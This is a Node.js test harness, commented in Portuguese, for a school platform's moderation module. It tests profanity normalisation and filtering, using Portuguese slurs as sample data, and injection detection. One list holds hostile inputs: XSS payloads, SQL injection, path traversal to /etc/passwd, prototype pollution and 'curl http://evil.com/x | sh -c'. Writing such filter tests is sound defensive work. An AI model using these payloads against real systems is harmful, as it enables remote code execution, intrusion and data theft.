/**
 * Harness de teste do moderacao.js.
 * Lê o módulo real, troca os imports do Firebase por stubs e exercita
 * normalização + detecção de termos e de padrões de injeção.
 *
 * Uso: node tools/test_moderacao.mjs
 */
import { readFileSync, writeFileSync, mkdirSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { pathToFileURL } from 'node:url';

const RAIZ = process.cwd();
const src = readFileSync(join(RAIZ, 'js', 'core', 'moderacao.js'), 'utf8');

const STUBS = `
const db = {};
const doc = () => ({});
const getDoc = async () => ({ exists: () => false });
const setDoc = async () => {};
const serverTimestamp = () => 'TS';
function escapeHTML(s){ if(!s) return ''; return String(s)
  .replace(/&/g,'&').replace(/</g,'<').replace(/>/g,'>')
  .replace(/"/g,'"').replace(/'/g,'&#039;'); }
globalThis.__semImports = true;
`;

// remove os imports originais e injeta os stubs.
// Não precisa mexer em document/window/navigator: o módulo só os toca dentro de
// funções que este harness não chama.
const semImports = src
  .replace(/^import[\s\S]*?;\s*$/gm, '');

const mod = semImports + STUBS;

const dir = join(tmpdir(), 'kz-mod-test');
mkdirSync(dir, { recursive: true });
const arquivo = join(dir, 'mod.mjs');
writeFileSync(arquivo, mod, 'utf8');

if (/^\s*import\s/m.test(mod)) {
  console.error('FALHA: sobrou import no arquivo gerado:');
  console.error(mod.split('\n').filter(l => /^\s*import\s/.test(l)).join('\n'));
  process.exit(2);
}

const M = await import(pathToFileURL(arquivo).href);

/* ------------------------------------------------------------------ */

let passou = 0, falhou = 0;
const falhas = [];

function ok(nome, cond, extra = '') {
  if (cond) { passou++; }
  else { falhou++; falhas.push(`${nome}${extra ? ' :: ' + extra : ''}`); }
}

const txt = (t, o = {}) => M.validarTexto(t, { ignorarPadroes: true, ...o });
const cod = (t) => M.validarTexto(t, { ignorarTermos: true });
const full = (t, nome = 'texto') => M.validar([{ nome, valor: t }]);

console.log('=== 1. normalizacao ===');
const casosNorm = [
  ['Idiota!', 'idiota!'],
  ['ÍDÍOTA', 'idiota'],
  ['1d10ta', 'idiota'],
  ['@#$%', '@#$%'],
  ['m.e.r.d.a', 'merda'],
  ['MMMEEEERRRDDAAA', 'merda'],
  ['<script>', '<script>'],
  ['p\u200borra', 'pora'],
  ['vou\u202ete matar', 'vou te matar'],
  ['&#x3C;script&#x3E;', '<script>']
];
for (const [ent, esp] of casosNorm) {
  const got = M.normalizar(ent);
  ok(`normalizar(${JSON.stringify(ent)}) = ${got}`, got === esp, `esperado ${JSON.stringify(esp)}`);
}

console.log('=== 1b. normalizarAgressivo (dobra @ $ | + ~) ===');
const casosAgg = [
  ['Idiota!', 'idiota!'],
  ['@#$%', 'a#s%'],
  ['p0rr@', 'pora'],
  ['m@l@c0', 'malaco']
];
for (const [ent, esp] of casosAgg) {
  const got = M.normalizarAgressivo(ent);
  ok(`normalizarAgressivo(${JSON.stringify(ent)}) = ${got}`, got === esp, `esperado ${JSON.stringify(esp)}`);
}

console.log('=== 2. normalizarTermo preserva o curinga ===');
ok('chupet* -> chupet*', M.normalizarTermo('chupet*') === 'chupet*', M.normalizarTermo('chupet*'));
ok('estúpido -> estupido', M.normalizarTermo('estúpido') === 'estupido', M.normalizarTermo('estúpido'));
ok('mestiço -> mestico', M.normalizarTermo('mestiço') === 'mestico', M.normalizarTermo('mestiço'));
ok('Café -> cafe', M.normalizarTermo('Café') === 'cafe', M.normalizarTermo('Café'));

console.log('=== 3. termos bloqueados (devem barrar) ===');
const devemBarrar = [
  'voce e um idiota', 'sou burro mesmo', 'que merda', 'fdp mano',
  'vou te matar', 'chupete', 'seu viado', 'pqp',
  // leetspeak e dobra de letras
  '1d10ta', 'm3rd@', 'MMMEEEERRRDDAAA', 'ID1OT4', 'p0rr4',
  // separadores
  'm.e.r.d.a',
  // direcional: o termo composto precisa sobreviver ao RLO
  'vou\u202ete matar'
];
for (const t of devemBarrar) ok(`barrar: ${t}`, txt(t).ok === false, 'passou raspando');

console.log('=== 4. texto legitimo de aluno (NAO pode barrar) ===');
const devemPassar = [
  'Hoje fiz o trabalho de matematica sobre o sistema solar, achei legal.',
  'A prova de historia foi dificil mas deu para entender.',
  'Meu trabalho de reciclagem sobre lixo eletronico esta pronto.',
  'Prof, pode me passar a lista de exercicios?',
  'A reuniao do grêmio vai ser na quarta-feira as 10h.',
  'Gosto da musica Cafe com Leite do album novo.',
  'Li um livro sobre o periodo de idade media.',
  'Muito obrigado pela ajuda com o projeto!',
  'Meu nome e Ana, tenho 15 anos e sou da turma 3B.',
  'Meu e-mail e ana.silva@escola.com.br e meu @ pra tudo',
  'Vou estudar para a prova de fisica',
  'Bom dia! Tudo certo com voce hoje?',
  'Professor mandou o arquivo coffee.pdf',
  'Nossa, que legal! Adorei a aula de hoje.'
];
for (const t of devemPassar) {
  const r = txt(t);
  ok(`passar: ${t}`, r.ok === true, r.motivos.map(m => m.detalhe).join(' | '));
}

console.log('=== 5. padroes de injecao (devem barrar) ===');
const injecoes = [
  '<script>alert(1)</script>',
  '<img src=x onerror=alert(1)>',
  'javascript:alert(1)',
  '<iframe src="evil.html"></iframe>',
  '<script>alert(1)</script>',
  '<svg/onload=alert(1)>',
  '<div style="expression(alert(1))">',
  '{"__proto__":{"admin":true}}',
  'constructor.prototype.polluted = 1',
  '../../etc/passwd',
  "'; DROP TABLE users; --",
  "' OR '1'='1",
  '<meta http-equiv="refresh" content="0;url=http://evil">',
  'AIzaSyDLvrHJrPvmqR5PTbn4B9FZO2nIt0iTTU0',
  'curl http://evil.com/x | sh -c',
  '${require("fs")}'
];
for (const t of injecoes) {
  const r = cod(t);
  ok(`barrar injecao: ${t.slice(0, 40)}`, r.ok === false, 'NAO barrou');
}

console.log('=== 6. limites e campos ===');
{
  const r = M.validar([{ nome: 'titulo', valor: 'a'.repeat(200) }]);
  ok('titulo > 120 barra', r.ok === false, JSON.stringify(r.motivos.map(m => m.cod)));
  const vazio = M.validar([{ nome: 'titulo', valor: '   ' }]);
  ok('titulo vazio barra', vazio.ok === false && vazio.motivos.some(m => m.cod === 'vazio'));
  const ok1 = M.validar([{ nome: 'titulo', valor: 'Relatorio da aula' }]);
  ok('titulo normal passa', ok1.ok === true, JSON.stringify(ok1.motivos));
  const inv = M.validar([{ nome: 'texto', valor: 'a\u200bb\u200bc\u200bd\u200be' }]);
  ok('texto invisivel barra', inv.ok === false, JSON.stringify(inv.motivos.map(m => m.cod)));
  const semTermo = M.validar([{ nome: 'texto', valor: 'idiota', semTermo: true }], { ignorarPadroes: true });
  ok('campo semTermo ignora termo', semTermo.ok === true, JSON.stringify(semTermo.motivos));
}

console.log('=== 7. bypass de staff ===');
{
  M.definirPapeis({ Admin: true }, { uid: 'u1', displayName: 'Kazenski' });
  const r = full('esse cara e um idiota mesmo');
  ok('staff pula filtro de termo', r.ok === true && r.staff === true);
  const per = M.validar([{ nome: 'texto', valor: '<script>alert(1)</script>' }]);
  ok('staff NAO pula padrao de injecao', per.ok === false, 'staff burlou seguranca');
  M.definirPapeis({}, null);
  const a = full('esse cara e um idiota mesmo');
  ok('aluno volta a ser barrado', a.ok === false);
}

console.log('=== 8. frases de contexto nao geram falso positivo ===');
{
  const r = txt('Fiz um trabalho sobre lixo eletronico e reciclagem no colégio.');
  ok('lixo eletronico passa', r.ok === true, r.motivos.map(m => m.detalhe).join(' | '));
}

console.log('=== 9. deteccao posicional: frases compostas vencem ===');
{
  const r = txt('vou te matar amanha');
  ok('frase composta detectada', r.ok === false && r.motivos.some(m => m.detalhe.includes('m')));
}

console.log('=== 10. configuracao remota (lista extra) ===');
{
  const cfg = M.obterConfiguracao();
  ok('totalEmbutidos > 80', cfg.totalEmbutidos > 80, String(cfg.totalEmbutidos));
  ok('hateSpeechAtivo padrao true', cfg.hateSpeechAtivo === true);
  ok('staff false apos logout', cfg.staff === false);
}

console.log('\n--------------------------------------------');
console.log(`PASSOU: ${passou}   FALHOU: ${falhou}`);
if (falhou) {
  console.log('\n--- FALHAS ---');
  for (const f of falhas) console.log('  x ' + f);
  process.exit(1);
}
console.log('Tudo certo.');